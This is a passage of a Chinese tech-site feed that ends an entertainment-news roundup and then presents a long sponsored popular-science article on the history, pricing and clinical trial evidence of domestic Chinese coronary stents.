年出版的同名小说，由瑞恩·高斯林、克里斯·埃文斯、安娜·德·阿玛斯主演，杰西卡·亨维克(《铁拳》《权力的游戏》)、瓦格纳·马拉(《毒枭》《精英部队》)、茱莉亚·巴特斯(《好莱坞往事》《美式主妇》)等共同参演，制作成本 2 亿美元以上，旨在打造一个《007》级别的间谍片系列。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/341e74327668507b969f24e502e5f8d4\"></figure><h3>亚马逊剧版《指环王》发布剧照，定档：明年 9 月 2 日</h3>\n<p>亚马逊剧版《指环王》发布剧照，并宣布开播时间：明年 9 月 2 日。该剧是史上投资最大的美剧之一，总花费预计高达 10 亿美元（共包含 5 季，可能还有一部衍生剧）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/3631fb3836d8cf11fd58b0d73f6577db\"></figure><h3>《名侦探柯南 警察学校篇》将改编为 TV 动画</h3>\n<p>8 月 4 日，青山刚昌的漫画《名侦探柯南》宣布将于 10 月 18 日发行第 100 卷，同时推出了一系列纪念计划，其中，新井隆广作画的漫画《名侦探柯南 警察学校篇 Wild Police Story》将改编为 TV 动画，讲述降谷零、松田阵平、萩原研二、伊达航、诸伏景光五位警察学校同期生的校园生活，他们也将在 2022 年剧场版中登场。 <a href=\"https://natalie.mu/comic/news/439465\" target=\"_blank\">来源</a></p>\n<h3>《数码宝贝》将推出新作 TV 动画和动画电影</h3>\n<p>8 月 1 日举行的数码祭 2021 现场活动中，万代宣布将推出新作 TV 动画《数码宝贝 Ghost Game》，今年 10 月开始播出，接档重启作《数码宝贝大冒险：》，系 2003 年来首次连续播映；2000 年开始播出的 TV 动画《数码宝贝大冒险 02》将推出新作剧场版，田口智久执导，大和屋晓编剧，上映时间待定。 <a href=\"https://twitter.com/DM_Partners/status/1421783495089606656\" target=\"_blank\">来源</a></p>\n<h3>更多</h3>\n<p><strong>动画电影《乔西的虎与鱼》确认引进，档期待定：</strong>8 月 4 日，日本动画电影《乔西的虎与鱼》发布中文海报。本作改编自田边圣子的同名小说，田村耕太郎执导，桑村沙耶香编剧，BONES 制作，讲述大学生恒夫与残疾女孩乔西的爱情故事，2020 年 12 月 25 日在日本公映，原著曾两度改编为真人电影。 <a href=\"https://maoyan.com/films/news/5678233\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/06/7422fdfd5621946cd0cc97af49b4e393.png\"></figure><p><strong>韦斯·安德森新作《法兰西特派》发布法版海报：</strong>韦斯·安德森新作《法兰西特派》发布法版海报。影片卡司包括：本尼西奥·德尔·托罗、艾德里安·布洛迪、蒂尔达·斯文顿、蕾雅·赛杜、弗兰西斯·麦克多蒙德、蒂莫西·柴勒梅德、琳娜·库德里、杰弗里·怀特、马修·阿马立克、斯蒂夫·朴、比尔·默瑞、欧文·威尔逊等。该片将于 10 月 22 日北美上映，10 月 27 日法国上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/06/9c340569017a6e568d94a8d0fffcd5fe.png\"></figure><p><strong>文牧野执导，易烊千玺主演新片《奇迹》曝演员阵容：</strong>据《综艺》报道，由文牧野执导，宁浩监制，易烊千玺领衔主演的电影《奇迹》演员阵容包括：王传君、咏梅、黄尧、张嘉益。</p>\n<p><strong>《壮志凌云2：独行侠》宣布将于 11 月 19 日日本上映：</strong>本片是 34 年前经典电影《壮志凌云》的续集，由汤姆·克鲁斯、方·基默回归出演，詹妮弗·康纳利、迈尔斯·特勒、格伦·鲍威尔等共同参演，将于 11 月 19 日在日本上映，同步北美。</p>\n<p><strong>郝蕾主演《寄生虫》舞台剧：</strong>曾获奥斯卡最佳影片的电影《寄生虫》改编的同名舞台剧官宣首位主演：郝蕾。目前郝蕾扮演的角色尚未公开，该剧将于明年开启演出。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/06/article/eb2abbcfa84876ce4157532cedd031fc\"></figure><p><strong>原创长篇动画《永远的 831》：</strong>WOWOW 电视台开台 30 周年纪念作品，《攻壳机动队 S.A.C》导演神山健治执导、编剧，CRAFTAR 制作，剧情梗概与具体形式未知，2022 年 1 月开始播出。 <a href=\"https://twitter.com/eienno831/status/1422512577049862150\" target=\"_blank\">来源</a></p>\n<p><strong>TV 动画《Code Geass 反叛的鲁路修》特别版：</strong>原版播出 15 周年纪念，将于 2021 年 10 月开始重播 TV 动画第一季，采用 FLOW 担当的新片头曲与 TK from 凛として時雨担当的新片尾曲。 <a href=\"https://twitter.com/GEASSPROJECT/status/1423116802964393984\" target=\"_blank\">来源</a></p>\n<p><strong>漫改真人电影《阿松》：</strong>改编自赤冢不二夫的同名漫画，英勉执导，偶像组合 Snow Man 主演，讲述松野家六胞胎的日常生活，预定 2022 年春季在日本上映，另曾改编为多部 TV 动画。 <a href=\"https://www.cinematoday.jp/news/N0125148\" target=\"_blank\">来源</a></p>\n<h2>🎪 彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/a612307a62de1ce84f460c411389fc92.png\"></figure><p>本期彩蛋是由读者 <a class=\"ss-atUser\" data-mention=\"@阿斯巴-甜\" user-id=\"bs2paklb34tcs0pn5j50\" href=\"https://sspai.com/u/hc5cbsf9\">@阿斯巴-甜</a> 提供的「看图猜电影」。首位猜中片名的读者，可获得彩蛋提供名额 1 次（彩蛋内容包括但不限于「猜电影」「你喜欢的经典影视作品/影人/台词」「电影冷知识」），和我们不定期发放的奖品。本期猜中的「第一名」将会在这篇文章中更新，届时也请各位参与互动的朋友注意站内私信~☆</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n","link":"https://sspai.com/post/68146"},{"title":"国物馆 | 国产冠脉支架 C 面观","date":"2021-08-06 08:37:12","description":"\n<h4><strong>编者注：</strong></h4>\n<p>在对消费者需求不断探索与「为国民，造好物」品牌理念的加持下，<a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 将现代年轻消费者的个性心理与传统文化巧妙结合，力求为大家带来更多时尚、潮流、有现代科技感、技术应用快人一步、高品质且价格友好的产品——而有着与之相同愿景的国货品牌亦不胜枚举。</p>\n<p>我们支持国际化潮流并主张消费自由，但不少平价好用的国货同时也正在被生生埋没，成为你购物车中不曾有过的遗珠之憾。于是少数派联合我们的好朋友 <a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 一起开启了这次国货推荐的征文活动，邀请了一些作者来分享他们使用下来认为不错的国货，在予你受用的同时也希望借此机会让更多的国货被看见。如果你也有心仪的国货想要推荐，非常欢迎你向我们投稿。</p>\n<hr>\n<h2>写在前面</h2>\n<p>大家好，我是致力于让没有医学背景的小伙伴能听懂医生在说啥的心内科 Leslie Pan。</p>\n<p>知道征文选题后我就有点想聊一聊国产冠脉支架，毕竟硕士期间参与了几项与支架有关的临床研究，发了几篇中英文综述，虽然不是介入医生但纸上谈兵地说一说循证医学的证据还是可以的。如果说支架生产商看支架是 A 面，负责放支架的介入医生看的是 B 面，那我这个看看文献和数据的就给大家分享一下我视野里的支架 C 面观。</p>\n<p>医疗器械的高端领域一直以来都是进口产品占据大多数的市场份额，大家在心里也会默认「进口的比国产的好」，而这在大多数的细分市场里都是难以辩驳的事实，但国产心血管介入器械很争气，国产产品基本已完成了进口替代，国产支架占据了近 70% 的份额，而这也是支架集中带量采购能够降价降得这么狠的市场基础。降价之后，冠脉支架也算一时火出了圈，「支架这么便宜还能不能用」这样的问题也多次被兄弟科室的小伙伴问到，咱们可以在介绍国产支架的时候一并聊一聊。</p>\n<p>受限于时间、篇幅和个人能力，文章一定会有讲得不到位甚至出错的地方，而我派读者藏龙卧虎，如果有同行做介入的前辈或是从事医疗器械相关行业的小伙伴发现了也希望不吝指出。</p>\n<p>声明：本人和任何支架生产厂商<strong>无利益相关</strong>，也不是介入医生，没有从支架相关企业拿过钱，本文纯粹从学术和科普的角度进行介绍。</p>\n<p>长文警告，全文超 1 万字，第一部分讲了冠脉介入治疗发展到现在的演化史，第二部分聊聊进入集采的国产支架及其厂商的其它支架，最后简单介绍了几种国产生物可吸收支架。第二部分往后会有大量的临床研究数据，内容相对枯燥。（如果对具体支架不是很感兴趣的小伙伴可以看前面关于支架技术发展的科普）</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/03/article/54caa92cc7f7a68505d7a3074a2104aa\"><figcaption>2018 年冠脉支架市场份额情况。乐普、微创、吉威国产三巨头分走 53% 的市场份额，雅培、美敦力、波士顿科学、爱德华生命科学、泰尔茂等国外企业占据 35%，其余 12% 还有赛诺、垠艺、金瑞凯利、万瑞飞鸿、桓晨等国产厂商参与竞争。来源：《中国医疗器械蓝皮书（2019 版）》</figcaption></figure><h2>什么是冠心病？没有支架时怎么治？</h2>\n<p>我们今天聊冠脉支架，也许有的人会问这玩意儿是干什么的？答：冠状动脉严重狭窄的治疗手段。</p>\n<p>但要解释清楚这个问题还要先搞清楚两件事：</p>\n<p>什么是冠心病？冠心病该怎么治？</p>\n<p>冠心病是冠状动脉粥样硬化性心脏病的缩写，本质是一个从出生开始就在不断进展的进程——动脉粥样硬化，指的是冠状动脉粥样硬化使管腔狭窄或阻塞引起心肌缺血、缺氧而引起的心脏病。所以从某种程度上来说，只要活得足够老，血管里斑块少不了，只是不是每个人都会严重到引起症状。</p>\n<p>成年人的心脏有自己握拳时两个拳头那么大，如果把心脏看做一个脑袋的话，冠状动脉刚好在脑袋外面环绕一圈，如「王冠」一般。冠脉是心脏自己的供血血管，而心脏又是一个 24/7 不间断工作的、对供血供氧需求特别大的「打工人 + 干饭人」，因此一旦冠脉狭窄严重或者完全堵塞了就相当于让马光干活不给吃草，劳累就相当于还拿鞭子抽它，这心脏可吃不消，轻则心绞痛，重则心肌梗死、甚至直接猝死。（下次有空给冠心病单独写一篇）</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/03/article/084461f6511ccbd6faf8fdc215db24a5\"><figcaption>血栓形成引起心肌梗死示意图：冠状动脉堵塞后引起下游的血管供血区域心肌细胞缺血坏死（Dead heart muscle 所指的黑色区域），圆圈放大后可见：黄色的斑块（Plaque）引起管腔狭窄，同时由于斑块内成分暴露在血管中引起血小板聚集、血栓（Thrombus）形成，堵塞了整根血管，导致下游无血液供应，引起心肌细胞缺血坏死。来源 <a href=\"https://www.alamy.com/illustration-showing-healthy-heart-small-and-plaque-in-coronary-artery-blood-clot-thrombus-breaking-off-and-blocking-blood-flow-cardiac-infarcti-image369890653.html\" target=\"_blank\">alamy.com</a></figcaption></figure><p>动脉粥样硬化的危险因素我在前面几篇文章中也有提及，包括年龄、性别（男）、遗传这些难以改变的，还有<strong>血脂异常、高血压、吸烟、糖尿病/胰岛素抵抗、超重和肥胖、不合理膳食、缺乏体力活动、心理应激、促血栓形成状态</strong>等可改变的因素。一般的治疗主要就是<strong>针对心绞痛症状和这些可改变的致病因素</strong>，一一纠正，扩张血管、抗血小板聚集、降脂、控制血压血糖、体重管理、戒烟等等。</p>\n<p>但当血管堵塞严重时，药物治疗难以很快改善症状，自 1967 年开始，病变严重的人可以选择在心外科开胸做<strong>冠状动脉搭桥术（Coronary Artery Bypass Grafting, CABG）</strong>，就是假设血管中间一段狭窄比较厉害，那就从自己身上取一条合适的血管，将这根血管一端缝在主动脉或主动脉的分支处，跨过堵塞的地方，另一端和远端的血管缝起来，就像一座桥连接两岸一样，从桥血管给缺血的远端供血。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/03/d0a4ea49c8d04479980001e2bf08a315.png\"><figcaption>冠状动脉搭桥术（CABG）的桥血管示意图，虚线放大区域显示冠状动脉堵塞，CABG 手术将桥血管一段缝在主动脉的分支左锁骨下动脉上，跨过堵塞的地方与血管远端缝合在一起。来源：<a href=\"https://www.sarh.org/centers-of-excellence/heart-institute/cardiovascular-surgery/coronary-artery-bypass-graft/\" target=\"_blank\">sarh.org</a>.</figcaption></figure><p>但这个手术通常需要在开胸、心脏停搏配合体外循环的条件下进行（也有不停跳的），技术难度、手术风险都相对较大，尤其对于那些只有 1 根血管有 1 处狭窄的简单病变患者来说，获益没有多支病变那么大，风险和经济压力却差不多。于是，「要是能把管子伸进血管里去把堵塞的地方通一通就好了」的想法在心血管专家脑袋里成形了。</p>\n<h2><strong>冠状动脉介入治疗进化史</strong></h2>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/03/article/9188a3fe9b729f7ff726ab2eabfb300b\"><figcaption>冠状动脉介入治疗 40 年</figcaption></figure><h3>从球囊扩张到裸金属支架</h3>\n<p>1977 年，Grüntzig 教授第一次给一位冠脉前降支近端存在明显狭窄的 38 岁男病人做了经皮冠状动脉成形术（Percutaneous Transluminal Coronary Angioplasty, PTCA）术，将导丝和球囊从动脉中送到心脏的冠脉，找到血管狭窄，再向自制的球囊中打气，撑开了他的病变，也撑开了冠脉介入治疗的新篇章。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/03/article/5053dcf696e67d6372f49adb431578d7\"><figcaption>左：Andreas Grüntzig 在导管室内工作；右：最初使用的球囊是在助理 Maria Schlumpf 的帮助下在他的厨房桌子上自制的。来源：Coronary balloon angioplasty, stents, and scaffolds.</figcaption></figure><p>但由于血管是有弹性的，球囊打气扩一下之后还会回缩回来，也无法解决血管内膜下的炎症反应，新生内膜增生还会再次引起管腔狭窄，发生率高达 30%-45%。有的病例甚至会因为球囊大力撑开后损伤内皮、引起中膜夹层、暴露促血栓形成的成分，引起血栓，发生要命的急性血管闭塞。介入治疗方法亟待优化。</p>\n<p>于是 1987 年，冠脉裸金属支架（Bare Metal Stents, BMS）问世，放根金属在血管里把堵塞的地方撑开来就不用担心血管回缩的问题了。第一个 BMS 在 1994 年得到美国食品药品监督管理局（Food and Drug Administration, FDA）批准上市，我国也在 90 年代初开展了 BMS 植入术。有金属支架撑在病变处就不怕血管弹性回缩了，极大程度地改善了血管狭窄，提高了术后管腔面积，也显著降低了 PTCA急性缺血并发症及远期再狭窄率，成为了划时代的治疗方法。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/03/article/c8e84bf92eea743bb1dcaebd8adaa5f6\"><figcaption>支架植入病变血管的动画示意图。动图截取自 YouTube: <a href=\"https://www.youtube.com/watch?v=I12PMiX5h3E\" target=\"_blank\">Animation - Coronary stent implantation from Mayo Clinic</a></figcaption></figure><h3>药物洗脱支架演化历程</h3>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/03/c6bd8b6443c65a300992fe47ea002eb9.jpeg\"><figcaption>支架是如何工作的：发现狭窄（A），输送就位，球囊撑开支架（B），支架贴壁后球囊撤回。目前的支架基本组成包括支架平台（Platform）、输送系统、涂层（Coating）和药物（drug）几个部分。来源：medicaldesignandoutsourcing.com</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/496aa500dbf2fde525c5f0509206bd3e.png\"><figcaption>目前最主流的支架设计，图中均为国外厂家的产品，仅用以展示支架设计的主要元素。来源：Coronary balloon angioplasty, stents, and scaffolds.</figcaption></figure><h4>Step 1</h4>\n<p>裸金属支架 BMS 顾名思义只有光秃秃的金属钢梁撑在血管内，对刚经受了手术的血管来说仍然是一种刺激，会引起新生内膜持续增生，导致支架内再狭窄发生率仍有 15%-30%，如何获得更好的长期疗效成了新的思考方向。这一次的探索诞生了药物洗脱支架（Drug-Eluting Stents, DES），一种在金属支架梁外包裹聚合物涂层、再搭载抗增殖药物的支架，这些涂层能保证药物以合适的速率释放，以抑制支架植入后的新生内膜增生反应，有效地降低了支架内再狭窄的发生率。分别于2003 年和 2004 年拿到 FDA 批准的 Cypher 支架和 Taxus 支架就属于这第一代 DES，以不锈钢为支架骨架，搭载雷帕霉素或紫杉醇抗内膜增殖。</p>\n<p>然而在美国强生生产的第一个 DES Cypher 支架进入市场销售 50 万枚之后，全球陆续有在支架植入后发生支架内血栓的病例报告，造成超过 60 例病人死亡，「冠脉支架成杀手」的新闻标题悚然出现在媒体上（现在依然有「心脏支架手术是否如最近朋友圈中传播的描述，是人体内的一枚定时炸弹？」这样好笑的问题可能就是从这儿来的）。</p>\n<p>支架植入之后最佳的状态是内皮细胞逐渐增殖爬上支架钢梁，将其覆盖，减少金属/涂层暴露在血流中以避免异物刺激血小板聚集，这一过程叫做<strong>内皮修复/愈合</strong>。而第一代支架搭载的抗增殖药物浓度较高，抑制了内皮自我愈合的过程；用于搭载药物的涂层技术尚未进化完全，接触血管成为炎症的持续刺激源；同时支架厚度较大，内皮细胞比较难爬上去，这些因素导致金属支架和涂层暴露在血流当中，相当于启动了外源性的凝血机制，血液在此凝固形成血栓，即<strong>支架内血栓，</strong>很可能会再次堵塞血管引起心梗。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/03/article/1299da02b45a191fb103622e3ec42cdf\"><figcaption>支架后的两大风险的示意图和对应的冠脉光学相干断层成像图像（中间的圆是管腔，辐射状的黑影是支架梁产生的）。A：新生内膜过度增生，管腔变得很小，即引起<strong>支架内再狭窄</strong>；B：管腔支架梁突出于管腔，提示贴壁不良引起内皮化延迟，有引起<strong>支架内血栓</strong>的风险；C：内膜正常修复后的管腔。来源：Drug-Eluting Coronary-Artery Stents.</figcaption></figure><p>这几个支架设计的核心问题抑制了内皮愈合的过程，并且在支架问世的早期，目前通用的术后预防支架内血栓的抗血小板治疗策略（什么药最好、要吃多久）尚未完全确立，这些因素造成了支架植入 1 年以后出现的晚期支架内血栓发生率明显高于 BMS。</p>\n<p>新一代的 DES 要想带给患者更安全有效的治疗就必须要解决这些问题。我们国产支架的发展也正是从此时开始一点点赶上外国企业的。</p>\n<h4>Step 2</h4>\n<p>为了解决上一小节提到的问题，支架设计选用<strong>更温和、更小剂量的抗增殖药物</strong>，用更坚硬、相容性更好的<strong>钴铬合金和铂铬合金</strong>取代了既往的不锈钢和镍钛合金，可以在保证有足够的支撑血管的力道、同时尽量降低厚度、减少刺激；搭载药物的涂层也在进化，一方面研究更好的药物控释技术，另一方面选取<strong>更具生物相容性的材料</strong>，或选择生物<strong>可降解材料做涂层</strong>，甚至干脆<strong>不用涂层</strong>、打孔放药（也有人称之为第三代 DES）。其余的设计改良还包括支架钢梁的结构分布，要做到「能屈能伸」——径向撑得开斑块，轴向能贴合弯曲的血管；以及聚合物涂层和药物的覆盖模式等。这些优化我就不一一细说了。</p>\n<p>这一次进化就诞生了目前临床上主流的第二代 DES，依据涂层是否会消失分为永久涂层 DES（Durable Polymer DES）和 可降解涂层 DES（Biodegradable Polymer DES）。注意，这里可降解的只是涂层，支架本身还是合金做的。</p>\n<p>目前临床上使用的 97% 以上都是第二代 DES，进口的以雅培的 Xience 系列、波士顿科学的 Resolute 系列为代表，这两型支架也是目前疗效的标杆。尤其是 Xience V 支架，支架梁厚度 81μm，全包裹式涂层分布，涂层的生物相容性好，成为了临床研究中难以超越的支架<strong>「金标准」</strong>。</p>\n<p>国产支架临床研究最有信心的会和 Xience 进行头对头对比，有的得到了非劣效的结果。详情咱们后面展开聊。</p>\n<h4>Step 3</h4>\n<p>前面的支架都是金属支架，即使药释放完了、涂层降解了，合金依然存在于血管里，好处是支撑力持久，坏处前面提到了一些，引起新生动脉粥样硬化斑块，导致支架内再狭窄、支架内血栓，而一旦发生，受支架丝的影响，处理起来也更困难，甚至需要支架里再放个支架，这样的操作也会增加支架内血栓的发生风险。支架永久存续也有一些少见并发症，例如支架丝断裂。同时，支架撑在那里，血管就被禁锢了，正常血管的收缩和舒张运动受到限制，得不到自由。一旦植入金属支架还需要终身服用抗血小板药物，以防止支架内血栓形成。</p>\n<p>这时候研发人员的思路就自然转向了生物可吸收支架（Bioresorbable Vascular Scaffolds, BVS），以可降解的聚合物或金属作为支架骨架。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/03/article/3e51042e846ea0f616ac20838bac97ac\"><figcaption>BVS 的理论获益。来源：Bioresorbable Vascular Scaﬀolds—Dead End or Still a Rough Diamond?</figcaption></figure><p>此前支架行业的巨头雅培推出了第一代 BVS——<strong>Absorb 支架</strong>，临床研究做遍全球，但由于支架 1 年内的血栓形成、2 年内的靶病变失败和心梗发生率都要高于第二代 DES，最终被迫<strong>遗憾退市</strong>。原本热情高涨的可降解支架发展势头被泼了盆冷水。</p>\n<p>BVS 支架设计被采用最多的可降解材料是聚左旋乳酸（Poly (L-lactic acid), PLLA），在完成撑开血管病变的使命后最终降解产物为水和二氧化碳，但受材料特性的限制，强度和金属支架比还有一定差距，设计上只能牺牲厚度来换取足够的支撑力，但太厚了内皮就很难爬上去，这就大大增加了支架植入早期的血栓形成风险。而在植入 1 年后支架水解过程中，如果支架梁没有被内皮完全覆盖就容易发生崩解，再次成为血管内的血栓形成刺激源。</p>\n<p>ABSORB 临床研究随访 3 年以上的数据也确实发现支架内血栓和靶血管心梗发生率显著高于钴铬合金 DES 对照组。</p>\n<p>目前也有其他国家的其它品牌的完全可降解支架，以 PLLA 支架居多，镁合金或锌合金做骨架的 BRS也有，很少，以铁合金或纯铁做骨架的则只有少数几家，这些支架的表现如何还有待长期的临床研究进一步验证。</p>\n<p>国家集中带量采购后冠脉支架售价断崖式下跌，销售额锐减，而暂时不受集采限制的「高端支架」BVS 成了未来市场的主要赛道，国产厂商也有不少在持续发力。现今全球从事 BVS 研究的公司总共有 50 多家，中国企业约占 1/3，进度条读得最快的要数乐普的 NeoVas，2019 年率先获批上市，华安的 Xinsorb 紧随其后，而微创的 Firesorb、百心安的 Bioheart、先健的 IBS、阿迈特的 AMsorb 等则落后一波，目前上市前的临床研究尚在随访中，后文会就已经有文献发表/结果公布的支架单独聊一聊。</p>\n<h2>国产冠脉支架</h2>\n<p>在展开来讲国产支架前，需要先解释一下与医疗器械上市前后研究有关的几个概念。</p>\n<p>冠脉支架这种创新型 3 类医疗器械在向国家药品监督管理局申请注册时需提交<strong>临床评价</strong>，临床意味着面向病人，必须在病人身上证实了可行性和安全性之后才能获批上市。在临床之前，还要完成一系列药理、毒理、材料、动物试验后才能被允许在人身上进行试验。并且需要先进行小样本的<strong>首次人体（First-in-Man, FIM）试验</strong>证明产品的可行性，再进一步进行样本量更大的<strong>确证性试验</strong>，以验证器械的安全性和有效性，上市后还需要完成更大样本量的临床研究。</p>\n<p>临床研究要入选病人通常有一定的纳入和排除标准以确保安全和更高的随访率，例如年龄要求 18 岁以上、心功能肾功能不会太差的。观察的指标叫<strong>终点或结局</strong>（endpoint/outcome），一般来说最严格、最硬的终点就是死亡，但是由于死亡的发生率比较低，如果要从硬终点比出差异的话样本量需要非常巨大，从经济和耗时的角度来说都不太现实，因此临床研究会选用一些复合终点作为代替。</p>\n<p>冠脉支架的临床研究的主要终点以<strong>靶病变失败</strong>（Target Lesion Failure, <strong>TLF</strong>）居多，什么意思呢？这是一个综合了心源性死亡、靶病变心梗、靶病变血运重建（就是再发心绞痛然后去做了介入/外科手术）这些数据得到的复合终点。除了主要终点外，还会有次要终点，比如<strong>主要心血管不良事件</strong>（Major Adverse Cardiac Event, <strong>MACE</strong>）、患者相关的心血管临床复合终点（Patient-oriented Composite Endpoint, PoCE）、<strong>支架内血栓</strong>等。在验证支架植入的有效性的时候会用到一些影像学的指标，例如<strong>晚期管腔丢失</strong>（Late Lumen Loss, <strong>LLL</strong>），就是说手术当时把血管撑开了，狭窄变小了，管腔更通畅了，然后在随访的时候再做个冠脉造影看看，此时的血管比刚做完手术时狭窄了多少。有的为了更准确地评估病变及支架梁内皮化的程度，会在冠脉造影之余加做血管内超声（IVUS）或光学相干断层成像（OCT）。（这个以后开一篇单独讲冠心病的时候再说吧）</p>\n<h3>国家集中带量采购中标的国产支架</h3>\n<p>很多读者之前应该都读到过「支架降价」的新闻，原来上万的冠脉支架竟然可以从 13000 元降到中位 700 元的价格。这是<strong>国家集中带量采购</strong>带来的影响，这次集采品种范围为「获得中华人民共和国医疗器 械注册证的上市冠状动脉药物洗脱支架系统，材质为钴铬合金或铂铬合金，载药种类为雷帕霉素及其衍生物」，规定了必须是<strong>已经拿到注册证</strong>的、已上市的支架，中标的多为上市 5 年以上的支架，大家不用担心「支架不能用」或是「便宜没好货」的问题——现在的价格是挺便宜，<strong>但主要还是以前的价格太贵了</strong>。</p>\n<p>那为什么价格能降 80% 甚至 95% 呢？主要是三方面：毛利率、经销商和市场份额。</p>\n<ul>\n<li>依据往年国产支架头部企业的招股书数据，各企业冠脉支架的<strong>毛利率都在 70%以上</strong>，其中营销成本超过 30%，而且降价幅度计算的挂网价也并非出厂价，而是进入医院之后需要医保和病人买单的价格，中间往往有多级经销商，每经一手都会涨一次价，进各个省市要招标，进医院也要招标。各个环节都会不同程度地推高价格。</li>\n<li>这一波集中带量采购一来取消所有的经销商，「<strong>没有中间商赚差价</strong>」。</li>\n<li>国产冠脉支架已经基本实现了进口替代，各品牌间的竞争比较激烈，直接采购确定了中标企业的<strong>基础市场份额</strong>，给企业<strong>节省了大量的营销费用</strong>，进一步降低了支架的成本，这意味着即使降价幅度达到 70% 以上生产商依然有得赚，只不过从豪赚变成了薄利多销。</li>\n</ul>\n<p>依据《报告 2019》，一项多中心研究对 4 家心脏中心 5875 例稳定型冠心病患者进行了评估，发现 20% 的冠脉介入治疗不适宜，因此集采还有一个优点，给介入医生拿走了「多放支架」的动机，减少了稳定型冠心病患者中支架滥用的现象。</p>\n<p>2018 年全年中国大陆地区（包括军队医院）冠心病介入总例数为 915 256 例。2018 年全国平均百万人口病例数 651 例，冠心病患者平均置入支架数为 1.46 个，冠状动脉介入手术死亡率为 0.26%。按照这个数据，一年至少用掉 133 万枚支架，国家集中带量采购首年的意向采购总量为 1074722 个，公示中标的支架中 80.3% 为国产支架，19.7% 为进口支架。集采之外尚有一些市场份额——留给「高端支架」一丝机会。</p>\n<p>下表是我总结的集采中标支架的特点，我会以集采意向采购量多少的顺序，来简单介绍一下这些临床上会首先用到的冠脉支架有哪些临床研究证据，再简单提一提这个厂家未进集采的支架。可能会有点枯燥，都是临床研究和数据——循证医学就是得拿研究和数据说话，这些研究虽说都是厂家赞助做的，但多数是多中心、有第三方的合同研究组织（CRO）进行监察和数据管理的，要所有人都造假也没那么容易（肯定也有不规范的，但近年来越来越规范化了）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/97602c168ad85fcb8f29aaa943c89b0b.png\"></figure><h4>Firebird2 &amp; FireKingFisher ——微创</h4>\n<p>微创原本是冠脉支架市场份额第二的公司，本次集采一跃成为占据最大份额的公司，Firebird2 及其升级版 Firekingfisher 的意向采购量占所有中标的 35.62%。</p>\n<p>Firebird2 是 2008 年通过认证获准上市的国内第一款钴铬合金 DES，也是国产支架中临床研究证据比较充分的。在上市前的临床研究（2005 年）中与美国美敦力公司 2003 年获批上市的第一代钴铬合金冠脉支架 Driver 进行对比（67 例比 49 例）， 结果在 MACE 和靶病变血运重建方面显著优于 Driver 支架。上市后微创还进行了 FOCUS 注册研究观察在真实世界中 Firebird2 的表现如何（无对照组），有 4720 人完成了 3 年的临床随访，结果显示术后 3 年 MACE 事件发生率 7.3%，TLF 发生率为 4.3%，支架内血栓发生率 2.06%，从数据上来看与美国美敦力和雅培的「金标准」支架在其它研究中的表现相仿。FireKingFisher 是 2020 年上市的，是 Firebird2 的升级版，保留了支架平台的设计，优化了输送系统，相当于从 iOS 14.4.1 升级到 14.4.2。</p>\n<p>微创生产的此次集采未能中标的支架有 FIREHAWK，这才是微创近几年的拳头产品，临床证据也比较充分。FIREHAWK 属于 BP-DES，钴铬合金支架平台、可降解聚合物，特点是表面刻槽载药的独特设计，靶向释放药物是宣传的优点，大大降低了负载药物剂量之余，使药物仅对血管壁方向释放，有效抑制血管内膜增生的同时，减少对血管再内皮化的影响。最重要的研究是 TARGET 系列，与 Xience 支架对比，在国内和国外都做了随机对照研究，尤其是 TARGET AC 研究，在真实世界中与 Xience 进行对比，术后 1 年 TLF 发生率是 6.1% vs. 5.9%，2 年随访时的 TLF 是 8.7% vs. 8.6%，其它各项指标也与 Xience 持平。</p>\n<h4>GuReater——乐普</h4>\n<p>乐普此前一直是国产冠脉支架领域的龙头企业，公司产品线主要包括了上面那张图上的所有类型：第一代 DES——Partner支架（2005 年获批），无涂层直接在支架平台上打孔搭载药物的 Nano+支架（2011 年获批），钴铬合金 DES GuReater 支架（2012 年获批），以及国内第一款获批上市（2019 年）的生物可吸收支架 NeoVas。</p>\n<p>GuReater 支架在 2012 年就已经上市了，但我未能检索到任何关于这个支架的已发表的文献，有可能是我检索手艺不精，也可能是临床评价未公开发表（目前公司尚未回复我发至其官方邮箱的咨询邮件，如果后续有回应我会在评论区补充）。据我做介入的小伙伴反映，这个支架算是临床用了挺久的了，但现在集采之前他们用的不多。</p>\n<p>Nano+ 支架采用不锈钢平台，支架梁的厚度约为 91 μm，没有聚合物涂层，而是采用在支架贴壁面打出大量纳米级小孔装入 2.2 μg/mm2 的雷帕霉素。在真实世界的注册研究中，Nano+ 支架植入术后1 年的 TLF 发生率为 3.1%，支架内血栓仅发生在 